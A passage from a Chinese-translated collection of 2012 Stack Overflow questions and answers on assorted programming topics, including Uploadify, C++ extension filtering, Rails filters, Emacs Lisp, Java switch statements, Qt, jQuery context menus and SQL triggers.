    }

);
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:14:42.693

我知道您可以采取两条路线，第一条是您“隐藏”按钮，第二条您可以“禁用”按钮。

第一个选项（确保在开始之前隐藏最后 4 个按钮）：

```
'onUploadSuccess':function(file, data, response){
$('#FileUpload1').hide();
$('#FileUpload2').show(); 
} 
```

第二种选择：

```
'onUploadSuccess':function(file, data, response){
    $('#FileUpload1').uploadify('settings', 'height', 0);
    $('#FileUpload1').uploadify('settings', 'width', 0);
    $('#FileUpload2').uploadify('settings', 'height', 400);  
    $('#FileUpload2').uploadify('settings', 'width', 400);
    } 
```

希望这会有所帮助...这里使用的是默认的uploadify ....

```
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>UploadiFive Test</title>
<!-- script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
<script src="jquery.uploadify.min.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="uploadify.css"-->
<style type="text/css">
body {
    font: 13px Arial, Helvetica, Sans-serif;
}
</style>
</head>

<body>
    <h1>Uploadify Demo</h1>
    <form>
        <div id="queue"></div>
        <input id="file_upload" name="file_upload" type="file" multiple="true">
        <input id="file_upload2" name="file_upload2" type="file" multiple="true">
    </form>

    <script type="text/javascript">
        <?php $timestamp = time();?>

        $(function() {
            $('#file_upload').uploadify({
                'formData'     : {
                    'timestamp' : '<?php echo $timestamp;?>',
                    'token'     : '<?php echo md5('unique_salt' . $timestamp);?>'
                },
                'swf'      : 'uploadify.swf',
                'uploader' : 'uploadify.php',
                'onUploadSuccess':function(file, data, response){
                $('#file_upload').uploadify('settings', 'height', 0);
                $('#file_upload').uploadify('settings', 'width', 0);
                $('#file_upload2').uploadify('settings', 'height', 400);  
                $('#file_upload2').uploadify('settings', 'width', 400);
                }
            });
        });
    </script>
    <script type="text/javascript">
        <?php $timestamp = time();?>
        $(function() {
            $('#file_upload2').uploadify({
                'formData'     : {
                    'timestamp' : '<?php echo $timestamp;?>',
                    'token'     : '<?php echo md5('unique_salt' . $timestamp);?>'
                },
                'swf'      : 'uploadify.swf',
                'uploader' : 'uploadify.php',
                'onUploadSuccess':function(file, data, response){
                $('#file_upload2').uploadify('settings', 'height', 0);
                $('#file_upload2').uploadify('settings', 'width', 0);
                },
                'onSWFReady' : function() {
                $('#file_upload2').uploadify('settings', 'height', 0);
                $('#file_upload2').uploadify('settings', 'width', 0);
        }
            });
        });
    </script>
</body>
</html> 
```

# c++ - 将字符串向量与字符串进行比较

> ID：13217326
> 
> 赞同：0
> 
> 时间：2012-11-04T09:06:00.720
> 
> 标签：c++, string, vector, compare

我还没有编写这个代码，因为我不确定哪个是解决这个问题的最佳方法。

对于初学者，程序现在所做的只是将与程序位于同一目录中的所有文件的名称放入一个字符串数组中，然后将该数组打印出来。

我想要做的是按文件扩展名对这些进行排序。将有一个特定扩展名列表供用户选择，之后文件夹中具有该扩展名的所有文件都将返回给用户。

我只是不知道该怎么做。首先想到的是遍历向量并将每个字符串与另一个具有所需扩展名的字符串进行比较，如果匹配，则将该字符串推入另一个特定于该文件扩展名的向量中。我只需要 5 个扩展，所以我不必为每个扩展创建大量新向量。

Alternativley 我认为永远不要填充原始向量，并首先接受用户请求，然后遍历文件并将所有具有匹配扩展名的文件推送到特定向量中也可能是有意义的。一旦完成，如果他们选择另一个选项，向量将被简单地清除并重新填充新的文件名。

关于如何实际进行比较的任何提示，我对 c++ 语法不太擅长，使用不同类型的容器是否明智？

非常感谢你们愿意为我提供的任何和所有建议，非常感谢！

```
#include <iostream>
#include <filesystem>
#include <vector>
using namespace std;
using namespace std::tr2::sys;

void scan( path f, unsigned i = 0 )
{
string indent(i,'\t');
cout << indent << "Folder = " << system_complete(f) << endl;
directory_iterator d( f );
directory_iterator e;

vector<string>::iterator it1;

std::vector<string> fileNames;

for( ; d != e; ++d )
{
    fileNames.push_back(d->path());

    //print out conents without use of an array
    /*cout << indent << 
        d->path() << (is_directory( d->status() ) ? " [dir]":"") <<
        endl;*/

    //if I want to go into subdirectories
    /*if( is_directory( d->status() ) )
        scan( f / d->path(), i + 1 );*/
}

for(it1 = fileNames.begin(); it1 != fileNames.end(); it1++)
{
 cout << *it1 << endl;
}

}

int main()
{
    path folder = "..";

    cout << folder << (is_directory( folder ) ? " [dir]":"") << endl;

    scan( folder );
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:22:05.663

您的意思不是“排序”，而是“过滤”。排序意味着完全不同的东西。

您的第二个选项似乎是最好的，为什么要使用两个向量进行额外的工作？

至于比较，困难在于你要找的东西在字符串的末尾，而大多数搜索函数都是从字符串的开头操作的。但是在 C++ 中有一个方便的东西叫做反向迭代器，它从结尾向后扫描字符串，而不是从开头向前扫描。您调用`rbegin()`and`rend()`来获取字符串的反向迭代器。这是一个使用反向迭代器的比较函数。

```
#include <algorithm>
#include <string>

// return true if file ends with ext, false otherwise
bool ends_with(const std::string& file, const std::string& ext)
{
    return file.size() >= ext.size() && // file must be at least as long as ext
        // check strings are equal starting at the end
        std::equal(ext.rbegin(), ext.rend(), file.rbegin());
} 
```

# ruby-on-rails - 跨控制器保持对象

> ID：13217336
> 
> 赞同：1
> 
> 时间：2012-11-04T09:08:14.523
> 
> 标签：ruby-on-rails, ruby, heroku

我正在使用 Rails 中的 heroku api，遇到了一个潜在的问题。

提交登录表单后，我正在实例化 heroku 对象。

```
heroku = Heroku::API.new(:username => USERNAME, :password => PASSWORD) 
```

然后我想在所有控制器中使用 heroku 对象来进一步查询 api。我试过@heroku、@@heroku 和$heroku，但都没有。这可能吗？

我发现它的唯一解决方案是使用 api 获取用户 api 密钥，将其存储在会话中，然后使用它在每个控制器方法中重新实例化 heroku 对象。这是最好/唯一的解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:26:17.350

一般来说， a`before_filter`可以解决您的重新实例化问题。如果您想设置一个可用于每个控制器方法的实例变量，请执行以下操作：

```
class UsersController < ApplicationController

  before_filter :get_user

  def profile
    # @user is accessible here
  end

  def account
    # @user is accessible here
  end

  private 

  def get_user
    @user = User.find(params[:id])
  end

end 
```

您还可以**在应用程序控制器中使用 before_filters**来设置可在所有控制器中访问的实例变量。 [在此处阅读有关过滤器的信息](http://guides.rubyonrails.org/action_controller_overview.html#filters)。

至于将 API 密钥存储到会话中，这是可行的，但如果您想要长期访问，您可能希望将 API 密钥写入数据库。结合之前的过滤器，您可以执行以下操作：

```
class ApplicationController < ActionController::Base

  before_filter :setup_heroku

  def setup_heroku
    if current_user && current_user.heroku_api_key
      @heroku = Heroku::API.new(:api_key => current_user.heroku_api_key)
    end
  end

end 
```

# function - 如何在 Emacs 中创建类似寄存器的函数

> ID：13217337
> 
> 赞同：0
> 
> 时间：2012-11-04T09:08:22.627
> 
> 标签：function, emacs, kill

我想使用 kill-ring 和寄存器的一些功能创建一个函数。

基本上我想创建一个新模式，在该模式`r`后面`p`应该把段落放在一个列表中（ `r w` 应该把这个词放在那个列表中）。

然后，`i`应该插入该列表中的任何内容。

这是我目前的注册：

```
(defun Navi-register-region ()
(interactive)
(copy-to-register ?N (region-beginning) (region-end))
) 
```

我对列表的历史不感兴趣，我只想让它不断地用当前选择的字符串替换变量中的字符串。

**编辑：**所以这就是我现在所拥有的，尽管它错误“错误的类型参数编号或标记”

```
(defun Navi-word-reg ()
  (interactive)
  (save-excursion 
          (right-word)
          (push-mark (point) t t)
          (left-word)
          (kill-ring-save (region-beginning) (region-end))
          (defvar bla (car kill-ring-yank-pointer))
          ; and here I would use something to remove last item from kill-ring 
              )) 
```

当我用 ( `interactive "r"`) 尝试它时，变量包含：

```
#("bla bla bla" 0 20 (fontified t)) 
```

使用以下功能时。

```
(defun Navi-region-reg (beg end)
      (interactive "r")
      (save-excursion (kill-ring-save (region-beginning) (region-end))
              (defvar bla (car kill-ring)))) 
```

如何提取“bla bla bla”？仍然......另一个问题是我希望能够将单词添加到变量“ `bla`”中。用 ( ) 是不可能的，`interactive "r"`对吧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T22:16:23.367

我花了很长时间，但它在这里（你自己额外的“注册/杀死环”：

```
(defun Navi-region-reg ()
  (interactive)
  (save-excursion (left-word 1)
          (mark-word) 
          (kill-ring-save (region-beginning) (region-end))
          (setq Navireg (substring-no-properties (car kill-ring)))
          (setq kill-ring (cdr kill-ring)))) 
```

并插入

```
(defun Navi-insert ()
 (interactive)
 (insert Navireg)
) 
```

# java - java清除内存缓存

> ID：13217338
> 
> 赞同：3
> 
> 时间：2012-11-04T09:08:24.057
> 
> 标签：java, memory-management

我正在尝试测试我编写的 Java 程序，以证明其效率。我有许多不同的测试要运行，并且我试图在运行时分析中保持精确。问题是不同的测试可能会访问磁盘上常见的信息。因此，为了在我的实验结果中保持“公平”，我想在实验之间以某种方式以编程方式清除我的 Java 程序正在使用的内部存储器。换句话说，我希望每个实验都有相同的“空内存/缓存”。

我尝试在实验之间读取一个大文件。我也尝试重新启动我的机器。有趣的是，当我读入一个大文件时，时间要糟糕得多，然后我只是重新启动机器（比如 40 秒到 5 秒）。除了在每次实验之间重新启动我的机器之外，清除内部内存的正确方法是什么（即避免通过普通磁盘访问进行实验的人为加速），这是不可行的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:35:44.200

> 清除内存的正确方法是什么

重新启动计算机。正如您所说，这可能不是最慢的选择。

计算机被设计为尽可能高效，故意使它们低效意味着对您想要使其低效做出一些假设，因此没有标准的方法来做到这一点。

清除已写入文件的缓存的一种方法是删除它们。如果要清除磁盘中要保留的文件的缓存，可以写入大量文件，大于主内存并删除它们。

如果您使用的是 Windows，它无论如何都不会使用所有内存来缓存文件。你可以做的是一次写几百MB的大文件，这需要多长时间。当缓存用尽时，您会看到 Java 花费的时间突然增加，并且您知道此时您可能已经清除了缓存。发生这种情况后，删除它们，您的缓存可能因此为空。

这可以帮助您获得可重现的结果，但这可能与重新启动并不完全相同。注意：除非您希望每次运行应用程序时都重新启动计算机，否则重新启动后所花费的时间可能无论如何都没有意义。

顺便说一句：您应该担心操作系统中的磁盘缓存。Java 不会缓存文件，除非在您创建的缓冲区和您编写的代码中，因此这些文件应该在您的控制之下。

# computer-architecture - 有什么区别？：集成电路与组合电路和时序电路

> ID：13217340
> 
> 赞同：-1
> 
> 时间：2012-11-04T09:08:55.957
> 
> 标签：computer-architecture

根据我的理解，（就 Moris Mano 第 3 版的计算机体系结构而言），组合电路是一组门，而时序电路是一组门加触发器。一方面，集成电路也由互连的门组成，这是否意味着它们是相同的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:20:22.017

组合电路 - 其输出始终完全由其电流输出定义的电路（没有记忆）

顺序电路 - 其输出可能取决于先前输入的历史的电路。

集成电路 - 实现为单个硅晶片（或其他材料）的电路。有些集成电路是组合的，有些是顺序的。官方定义见[http://en.wikipedia.org/wiki/Integrated_circuit](http://en.wikipedia.org/wiki/Integrated_circuit)

# css - 由于 text-shadow 和 font-smooth 不起作用，如何使我的网站上的字体平滑？

> ID：13217346
> 
> 赞同：1
> 
> 时间：2012-11-04T09:09:27.937
> 
> 标签：css, fonts

我已经在[http://downpublic.info/wpdemo/forSky/up-next/](http://downpublic.info/wpdemo/forSky/up-next/)上完成了标题。但是，文本看起来参差不齐且不平滑。

我尝试了以下方法：

```
font-smooth: always;
text-shadow: 1px 1px 2px #color; 
```

现在顶部似乎不起作用（我听说它在某些情况下不起作用），并且文本阴影似乎使字体发光，不仅仅是平滑。

当我被难住时，我应该在哪里寻找导致此问题的 CSS？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:29:41.880

通常，您应该避免在 Web 制作中使用 ttf 或 otf 字体，因为它们在缩放时会在某些浏览器中看起来参差不齐。您应该改用可嵌入的 opentype 格式。

您可以使用[FontSquirrel](http://www.fontsquirrel.com/fontface/generator)生成一个字体包，其中包含您的字体的网络安全版本（也包括 css），您可以将其与您的网页一起使用。

# delphi - 限制窗口移动到父窗口区域

> ID：13217347
> 
> 赞同：0
> 
> 时间：2012-11-04T09:09:36.970
> 
> 标签：delphi, winapi, delphi-xe2, ribbon

我正在使用 TRibbon 开发一个 delphi 程序并启动单独的 exe 文件。一旦我执行了外部应用程序（使用 CreateProcessA() ），我将其父级设置为带有功能区的表单：

```
wHandle := FindWindow('MainRibbonForm');
Winapi.Windows.SetParent(wHandle,self.Handle); 
```

总而言之，这没问题，但问题是申请表可以在主窗体中的 TRibbon 上移动。我正在考虑限制表单在主应用程序中的移动，但我该如何考虑功能区？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T09:15:54.463

将 TPanel 作为容器放置在您的表单上，并将此 TPanel 用作父级。现在 Child 只能在 TPanel 内移动。

```
wHandle := FindWindow( 'MainRibbonForm' );
SetParent( wHandle, MyContainerPanel.Handle ); 
```

# http - HTTP | 命名机构

> ID：13217348
> 
> 赞同：0
> 
> 时间：2012-11-04T09:10:04.850
> 
> 标签：http

*通过阅读 HTTP 规范，我在描述Host*请求标头字段*的部分中遇到了“命名权限”术语。这是摘录：

> Host 字段值必须代表原始 URL 给出的源服务器或网关的**命名权限。**

这是什么意思？为什么他们不使用术语“名称”或“域”？
________
* [RFC 2616\. 超文本传输​​协议 -- HTTP/1.1](http://www.ietf.org/rfc/rfc2616.txt)（第 128 页，14.23 主机）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:47:45.937

它使用 RFC 2396 中的术语（在编写 RFC 2616 时定义了 URI）。

注意：您可能需要阅读[http://greenbytes.de/tech/webdav/draft-ietf-httpbis-p1-messaging-21.html](http://greenbytes.de/tech/webdav/draft-ietf-httpbis-p1-messaging-21.html)，它目前位于“Last Call”中。

# wordpress - 在 wordpress 中调整图像失败

> ID：13217349
> 
> 赞同：0
> 
> 时间：2012-11-04T09:10:45.130
> 
> 标签：wordpress

我正在尝试使用此代码在 wordpress 中调整图像的大小

```
if ( function_exists( 'add_image_size' ) ) {
    add_image_size( 'My Thumbnail', 300, 100, true ); //(cropped)
}

add_filter('image_size_names_choose', 'my_image_sizes');
function my_image_sizes($sizes) {
        $addsizes = array(
                "new-size" => __( "New Size")
                );
        $newsizes = array_merge($sizes, $addsizes);
        return $newsizes;
} 
```

但是媒体上传器上禁用了新尺寸的单选按钮，因此无法选中。我正在使用 wordpress 版本 3.4.2。为什么它会失败？。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:21:57.043

我发现我没有安装 php-gd 所以我在 ubuntu 中安装了

> sudo apt-get install php5-gd

然后在functions.php中添加此代码

```
if ( function_exists( 'add_image_size' ) ) {
    add_image_size( 'new-size', 300, 100, true ); //(cropped)
}

add_filter('image_size_names_choose', 'my_image_sizes');
function my_image_sizes($sizes) {
        $addsizes = array(
                "new-size" => __( "New Size")
                );
        $newsizes = array_merge($sizes, $addsizes);
        return $newsizes;
} 
```

它奏效了。

# java - switch 语句未初始化的变量

> ID：13217351
> 
> 赞同：7
> 
> 时间：2012-11-04T09:11:13.460
> 
> 标签：java, switch-statement

以下代码给了我：`The local variable str may not have been initialized`

```
public class experiment{

    public static void main(String[] args){

        int day = 1;
        String str;

        switch (day) {
        case 1 : str = "nice";
        break;
        }

        System.out.println(str);

    }

} 
```

所以，我给出了`str`一个`null`值，它起作用了，但我仍然想知道为什么文档上的那个在没有先初始化值的情况下工作，我已经三重检查了，我认为我没有任何拼写错误：

```
public class SwitchDemo {
    public static void main(String[] args) {

        int month = 8;
        String monthString;
        switch (month) {
            case 1:  monthString = "January";
                     break;
            case 2:  monthString = "February";
                     break;
            case 3:  monthString = "March";
                     break;
            case 4:  monthString = "April";
                     break;
            case 5:  monthString = "May";
                     break;
            case 6:  monthString = "June";
                     break;
            case 7:  monthString = "July";
                     break;
            case 8:  monthString = "August";
                     break;
            case 9:  monthString = "September";
                     break;
            case 10: monthString = "October";
                     break;
            case 11: monthString = "November";
                     break;
            case 12: monthString = "December";
                     break;
            default: monthString = "Invalid month";
                     break;
        }
        System.out.println(monthString);
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-04T09:12:19.013

因为文档示例`default`中有一个 case 语句。`switch`如果没有其他`case`语句匹配，则调用它。在您自己的代码中，您没有这样的“后备”。

因此，总是至少有一个被调用的语句，它总是会初始化`monthString`。

# css - Google Chrome 扩展中的随机空格

> ID：13217353
> 
> 赞同：1
> 
> 时间：2012-11-04T09:12:33.303
> 
> 标签：css, google-chrome-extension, fieldset

我有一些 CSS：

```
fieldset {
    border-radius: 5px;
    border: 3px solid blue;
    padding: 5px;
    margin: 0em;
}
legend {
    font-weight: bold;
    color: green;
}
#myform{
    width: 330px;
    margin: 0em;
}
body {
    font-family: Arial, sans-serif;
} 
```

当我用 嵌入它时`<style>`，它工作得非常好：

![带有嵌入式 CSS 的扩展](../Images/3c33720cdca338b863535d24cbc9144a.png)

但是，当我将相同的 CSS 放入样式表并使用 导入时`<link>`，我会得到一些随机空格：

![具有相同 CSS 的扩展，但使用 <link> 从外部样式表导入](../Images/dc2b60b74294f8014b6f9e96dd3750f3.png)

我已经完全删除了表单元素，并且仍然有空格（尽管如果我将它们保留在里面，它会更多）。我使用 Chrome 开发人员控制台来检查表单和正文高度`$(body).css("height")`（表单也是如此），它给了我一个太小而无法包含空格的数字，但如果忽略空格，它似乎与高度匹配。这是从哪里来的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T13:07:46.213

这似乎是一个错误，当在开发人员控制台中来回更改主体的边距时，它再次正确。在 CSS 中设置此属性根本没有任何效果。

一个微不足道的解决方法是为您的弹出窗口创建一个 javascript 文件，例如`popup.js`，然后在加载弹出窗口后更改其中的边距：

```
document.addEventListener('DOMContentLoaded', function() {
  document.body.style.margin = '8px';
}); 
```

我将`8px`其作为值，因为这是 Chrome 弹出窗口的标准值：

![在此处输入图像描述](../Images/4f52e6fefe84bebb4ccfd70144c45636.png)

您应该考虑将此错误报告给[Chrome 问题列表](https://code.google.com/p/chromium/issues/list)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:03:39.497

将 CSS 与 !important 关键字即

```
#myform{
    width: 330px !important;
    margin: 0em !important;
} 
```

# objective-c - 无法识别 tableView 参数是否为 seachResultsTableView

> ID：13217362
> 
> 赞同：0
> 
> 时间：2012-11-04T09:13:21.120
> 
> 标签：objective-c, ios, uisearchbar, uisearchresultscontroller

我正在开发一个 iOS 6 应用程序。

我想在Apple的`UITableView`这个[表搜索示例中添加搜索功能。](http://developer.apple.com/library/ios/#samplecode/TableSearch/Introduction/Intro.html)但是，我的实现不起作用。

在`- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath`我不知道如果`tableView`参数是`searchDisplayController.searchResultsTableView`.

看看这个截图：

![在此处输入图像描述](../Images/5e447f6e7bed29eec6ca77c4a0b92ef4.png)

如您所见，`tableView`是 a `UISearchResultsTableView`，但这一行：

```
if ([tableView isEqual:self.searchDisplayController.searchResultsTableView]) 
```

它总是错误的。

也许，我需要添加一个插座来访问`seachResultsTableView`，但我还没有在[TableSearch](http://developer.apple.com/library/ios/#samplecode/TableSearch/Introduction/Intro.html)示例中找到那个插座。

这`ViewController.h`：

```
@interface ViewController: UIViewController <UITableViewDelegate, UITableViewDataSource, UISearchDisplayDelegate, UISearchBarDelegate> { 
```

**我需要做什么才能使其工作？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T12:18:40.800

```
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
}

if(searching) 
{
    cell.textLabel.text = [searchedListOfItems objectAtIndex:indexPath.row];
}
else {

    NSDictionary *dictionary = [self.tableDataSource objectAtIndex:indexPath.row];
    cell.textLabel.text = [dictionary objectForKey:@"Title"];
}

return cell; 
```

如果您想要实现的只是正常搜索，请使用它。

# iphone - 我如何知道我何时使用 Reachability 与我的服务器建立了连接？

> ID：13217365
> 
> 赞同：1
> 
> 时间：2012-11-04T09:13:36.843
> 
> 标签：iphone, objective-c, ios, xcode, reachability

我需要在我的应用程序错误报告中实施。我已经有这个错误报告，但问题是我使用grabURLInBackground 来发送错误，这不是一个好主意，因为我需要将这些错误保存在数组中，并且只有当我与服务器建立连接时，我才需要发送所有这些错误是在一起的。所以我的问题是我如何“监听”服务器连接？我怎么知道何时发送我的错误（连接可用）？我需要在后台做吗？什么？我希望你们理解我:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:27:09.380

您将获得大量具有可达性的示例代码。其实你可以google一下。我没有找到完全适合我的解决方案。

[这](https://stackoverflow.com/questions/2033042/how-to-use-reachability-class-to-detect-network-status)是一个类似的问题，也许。

这是我的测试用例：

将您的设备连接到 WI-FI 路由器，然后从路由器上拔下 WLAN，这样可以连接到 WI-FI，但无法连接到互联网。

案例2：插入一张SIM卡，打开允许通过3G设置的数据，但该卡没有3G数据计划。

所有的可达性都会说有互联网连接，所有的 api 调用都是假的......

# c# - 在 MaskedTextbox 上更改时间

> ID：13217367
> 
> 赞同：3
> 
> 时间：2012-11-04T09:14:13.740
> 
> 标签：c#

我想在我的应用程序中的 maskedtextbox 上设计更改时间，例如时间每秒都在变化的窗口。我已将 maskedtexbox1 设置如下：

```
maskedTextBox1.Text = DateTime.Now.ToShortTimeString(); 
```

它显示当前系统的时间很短，但它并没有像 Windows 那样每秒都在变化。怎么做？

我在 Visual Studio 2005 上，.NET**低于**3.5。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:20:18.677

我想你需要设置一个`maskedTextBox1`每秒更新你的计时器。

有关如何执行此操作，请参阅：[将计时器添加到 Windows 窗体应用程序](https://stackoverflow.com/questions/1142828/add-timer-to-a-windows-forms-application)

干杯。基思。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T09:22:33.053

您可以使用[`System.Windows.Forms.Timer`](http://msdn.microsoft.com/en-us/library/system.windows.forms.timer.aspx)每秒更新文本框值，例如：

```
var timer = new Timer();
timer.Interval = 1000;

timer.Tick += delegate
            {
                textBox1.Text = DateTime.Now.ToLongTimeString();
            };

timer.Start(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T09:26:29.700

我会使用计时器并每秒触发一个事件来更新时间。

1.  创建一个计时器（[System.Windows.Forms](http://msdn.microsoft.com/en-us/library/system.windows.forms.timer.aspx)`Timer`包中的类实例）。
2.  将其频率设置为 1 秒（即 1000 毫秒）。
3.  告诉它在它关闭时调用什么方法（事件处理程序`Kaboom`）。

在您的可执行代码中的某处，您可以通过键入以下内容来执行此操作。

```
Timer ticker= new Timer();
ticker.Interval = 1000;
ticker.Tick += new EventHandler(Kaboom); 
```

在同一个类中（或者，如果你有信心怎么做，你可以在某个地方访问代码）你还**为触发**的滴答事件创建处理程序，以便你做出的关于在什么时候调用的方法的承诺计时器关闭保持。

```
private void Kaboom(Object sender, EventArgs eventArgs)
{
  // Execute the tickability code
  MaskedTextBox1.Text = DateTime.Now.ToShortTimeString();
} 
```

另外，当你觉得你准备好了时，不要忘记真正**开始你的代码。**

```
MyTimer.Start(); 
```

多田！

编辑：

为了完整起见，我还将粘贴@CuaonLe 的部分回复（.NET 3.5 或更高版本的能力和要求更高的阈值）。

```
Timer timer = new Timer { Interval = 1000 };
timer.Tick += (obj, args) 
  => MaskedTextBox1.Text = DateTime.Now.ToLongTimeString();
timer.Start(); 
```

# iphone - 在数组中使用 .jp2 图像

> ID：13217372
> 
> 赞同：1
> 
> 时间：2012-11-04T09:15:24.293
> 
> 标签：iphone, objective-c, ios, xcode, jpeg2000

我在我的应用程序中使用需要具有透明度的图像。它们目前是 .png 文件，但将它们转换为 .jp2 (JPEG 2000) 会显着减小文件大小。我将它们添加到 Xcode 项目中，但是当我运行应用程序时它们没有加载。这是否意味着 Xcode/Objective C 不支持 .jp2 文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T09:28:36.247

你有[苹果](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIImage_Class/Reference/Reference.html)支持的文件，我看不到 jp2。所以我的回答是：**不，不支持 jp2**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T09:28:52.177

[在这里](https://developer.apple.com/library/ios/documentation/uikit/reference/UIImage_Class/Reference/Reference.html)您可以找到 iOS UIImage 支持的图像。.jp2 格式不在该列表中。所以不支持。

# restkit - RestKit 0.10.3 保存问题

> ID：13217377
> 
> 赞同：1
> 
> 时间：2012-11-04T09:15:55.180
> 
> 标签：restkit

我最近继承了一个使用 RestKit 的 Xcode 项目，并将其升级到 0.10.3 以使其在 iOS6 下工作。

JSON 响应对象映射似乎一切正常，尽管我有一个问题，即某些子集合实际上没有保存。

例如我有

```
syncResponse.newEntities.customers 
```

然后每个客户都有一个地址数组。

我使用以下调用在 didLoadObjects 之后保存：

```
NSError* err = nil;
[[[RKObjectManager sharedManager] objectStore] save:&err]; 
```

我发现这只会保存客户，而不会保存地址数据或任何子集合。当我导航到客户视图时，地址区域为空。

但是，如果我在保存行之前添加以下代码块，则会在 xCode 输出中打印出郊区列表，并且地址会保留，一切都很好。

```
 for (Customer* customer in syncResponse.newEntities.customers)
    {
        for (Address *address in [customer address]) {
            NSLog(@"%@", address.suburb);
        }
    } 
```

有什么理由会发生这种情况，或者应该调用不同的保存方法吗？

非常感激任何的帮助！

# c++ - 如何在 Qt 中翻转图像？

> ID：13217380
> 
> 赞同：0
> 
> 时间：2012-11-04T09:16:42.867
> 
> 标签：c++, qt, qml, qlabel

我在 Youtube 上找到[了那个视频。](http://www.youtube.com/watch?v=eZyV4f9r5m8)它展示了如何翻转称为 QML Flipable 的东西。我对 QML 完全不熟悉，所以我有以下问题：

1）可以像这样翻转普通的QLabel吗？如果是，我该怎么做？

2）如果不可能，那么如何将该可翻转实体添加到我的 QMainWindow 中？

感谢大家

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:44:53.367

没有方便的方法来做到这一点。桌面操作系统不提供此功能。

一种选择是使用 QGraphicsView。例如，您可以使用 将小部件添加到 QGraphicsScene `QGraphicsScene::addWidget()`，然后按照您想要的方式转换视图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T09:51:27.110

您可以将[QGraphicsPixmap](http://doc.qt.digia.com/qt/qgraphicspixmapitem.html)与您的图像一起使用，使用 setTransformOriginPoint 设置旋转中心并使用[QProertyAnimation为变换矩阵设置动画](http://qt-project.org/doc/qt-4.8/qpropertyanimation.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T20:50:06.760

快速谷歌搜索将我指向一篇博客[文章](http://kunalmaemo.blogspot.com/2011/03/flipping-rotating-view-animation-in-qml.html)，视频的作者 (Kunal Parmar) 描述了这种特殊效果是如何完成的。

# jquery - 上下文菜单操作

> ID：13217384
> 
> 赞同：0
> 
> 时间：2012-11-04T09:17:28.747
> 
> 标签：jquery, contextmenu

我正在使用 jquery 上下文菜单插件[https://github.com/joewalnes/jquery-simple-context-menu/blob/master/README.md](https://github.com/joewalnes/jquery-simple-context-menu/blob/master/README.md)

现在我在菜单上有两个选项 1\. 发送消息 2\. 查看个人资料

当用户单击 1\. 发送消息时，我想在屏幕中央打开弹出窗口。当用户点击 2\. 查看配置文件时，它应该发送给他们 url（例如链接到配置文件）

我从未使用过上下文菜单，我在 php 中使用动态传递用户 ID。我现在一切正常，但不知道如何打开弹出窗口并发送到 url。

这是javascript

```
$(function() {
    $("#mythingy").contextPopup({
        title: "My Popup Menu",
        items: [{
            label: "Send message",
            icon: "icons/message.png",
            action: function() {
                // how to open popup window with form
            }
        },
        {
            label: "View profile",
            icon: "icons/zoom.png",
            action: function() {
                // how to add url here
            }
        }]
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:50:29.030

导航到另一个页面很容易 - 只需分配给`location.href`.

```
location.href = "http://example.com/profile?id=" + id 
```

jQuery 没有为此提供替代方案，但如果你*真的*想使用 jQuery，你可以这样做：

```
$(location).attr('href', "http://example.com/profile?id=" + id) 
```

* * *

对于弹出窗口，您可以使用 jQuery 的[Fancybox](http://fancyapps.com/fancybox/)插件。

```
<div id="message-form"> <!-- hide with display:none from css -->
  ...
</div> 
```

打开：

```
$.fancybox($("#message-form")) 
```

* * *

如果你想打开一个单独的浏览器窗口而不是在页面内打开一个弹出窗口，你可以使用`window.open()`：

```
var w2=window.open();
$(w2.document.body).append($("#message-form").clone()); 
```

# sql - 列约束 Sql 2008

> ID：13217385
> 
> 赞同：0
> 
> 时间：2012-11-04T09:18:46.983
> 
> 标签：sql, constraints

我一直在尝试找出是否可以在插入时打开一列，并在更新时关闭。我的意思是，我需要一个列，我只能在 Insert 上给它一个值，但是如果我尝试用 Update 给它一个值，语句就会失败。

我正在使用 SQL 2008 ...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:22:37.870

你不能用约束来做到这一点——你需要为此使用[触发器](http://msdn.microsoft.com/en-us/library/ms189799.aspx)。

> 触发器是一种特殊类型的存储过程，当数据库服务器中发生事件时会自动执行。DML 触发器在用户尝试通过数据操作语言 (DML) 事件修改数据时执行。DML 事件是表或视图上的 INSERT、UPDATE 或 DELETE 语句。

# android - 将标题添加到 GridView (Android)

> ID：13217386
> 
> 赞同：33
> 
> 时间：2012-11-04T09:19:28.073
> 
> 标签：android, gridview, scrollview

